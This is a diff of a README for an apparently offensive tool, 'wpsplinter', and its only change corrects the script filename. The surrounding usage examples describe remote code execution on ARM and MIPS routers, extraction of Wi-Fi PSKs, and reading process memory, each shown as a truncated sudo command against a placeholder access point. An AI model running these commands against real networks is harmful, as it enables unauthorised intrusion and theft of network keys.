@@ -100,7 +100,7 @@ cd wpsplinter
 pip install scapy
 
 # Verify installation
-python3 wpslinter.py --help
+python3 wpsplinter.py --help
 ```
 
 ## Usage
@@ -108,7 +108,7 @@ python3 wpslinter.py --help
 ### Basic Syntax
 
 ```bash
-python3 wpslinter.py --iface <interface> --bssid <AP_MAC> --ssid <network> --phase <phase> [options]
+python3 wpsplinter.py --iface <interface> --bssid <AP_MAC> --ssid <network> --phase <phase> [options]
 ```
 
 ### Example Commands
@@ -118,7 +118,7 @@ python3 wpslinter.py --iface <interface> --bssid <AP_MAC> --ssid <network> --pha
 Detect if the target AP is vulnerable:
 
 ```bash
-sudo python3 wpslinter.py \
+sudo python3 wpsplinter.py \
     --iface wlan0 \
     --bssid AA:BB:CC:DD:EE:FF \
     --ssid "MyNetwork" \
@@ -130,7 +130,7 @@ sudo python3 wpslinter.py \
 Remote code execution on ARM targets:
 
 ```bash
-sudo python3 wpslinter.py \
+sudo python3 wpsplinter.py \
     --iface wlan0 \
     --bssid AA:BB:CC:DD:EE:FF \
     --ssid "MyNetwork" \
@@ -145,7 +145,7 @@ sudo python3 wpslinter.py \
 Remote code execution on MIPS targets:
 
 ```bash
-sudo python3 wpslinter.py \
+sudo python3 wpsplinter.py \
     --iface wlan0 \
     --bssid AA:BB:CC:DD:EE:FF \
     --ssid "MyNetwork" \
@@ -162,7 +162,7 @@ sudo python3 wpslinter.py \
 Extract PSK from a specific memory offset:
 
 ```bash
-sudo python3 wpslinter.py \
+sudo python3 wpsplinter.py \
     --iface wlan0 \
     --bssid AA:BB:CC:DD:EE:FF \
     --ssid "MyNetwork" \
@@ -191,7 +191,7 @@ Test with: wpa_passphrase <SSID> <PSK>
 Automatic multi-strategy PSK extraction:
 
 ```bash
-sudo python3 wpslinter.py \
+sudo python3 wpsplinter.py \
     --iface wlan0 \
     --bssid AA:BB:CC:DD:EE:FF \
     --ssid "MyNetwork" \
@@ -208,7 +208,7 @@ This will:
 Read raw process memory:
 
 ```bash
-sudo python3 wpslinter.py \
+sudo python3 wpsplinter.py \
     --iface wlan0 \
     --bssid AA:BB:CC:DD:EE:FF \
     --ssid "MyNetwork" \
@@ -221,7 +221,7 @@ sudo python3 wpslinter.py \
 For patched firmware versions:
 
 ```bash
-sudo python3 wpslinter.py \
+sudo python3 wpsplinter.py \
     --iface wlan0 \
     --bssid AA:BB:CC:DD:EE:FF \
     --ssid "MyNetwork" \
